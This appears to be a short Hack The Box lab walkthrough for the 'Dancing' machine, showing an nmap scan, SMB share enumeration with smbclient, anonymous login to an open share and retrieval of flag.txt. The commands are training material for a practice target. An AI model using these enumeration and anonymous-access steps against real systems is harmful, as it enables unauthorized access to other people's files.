# Dancing — HTB Starting Point

## Box Info
- **Difficulty:** Very Easy  
- **IP Address:** (from HTB portal, e.g., `10.129.x.x`)  
- **Skills Learned:**  
  - Enumerating SMB shares  
  - Accessing and downloading files from SMB  
  - Identifying clear-text credentials  

---

## Enumeration

First, we scan the target for open ports:  
nmap -sV -Pn 10.129.x.x

Results:
Nmap scan report for 10.129.x.x
Host is up (0.72s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.79 seconds

I listed available SMB shares:

smbclient -L 10.129.x.x
Output:
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
WorkShares      Disk

Exploitation
We connect without credentials due to poor misconfiguration:

smbclient //10.129.x.x/WorkShares -N
Once inside, we explore:
ls
 .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

cd James.P\
ls

I find a file named flag.txt.

Download it:
get flag.txt

Then cat locallay to see the contents
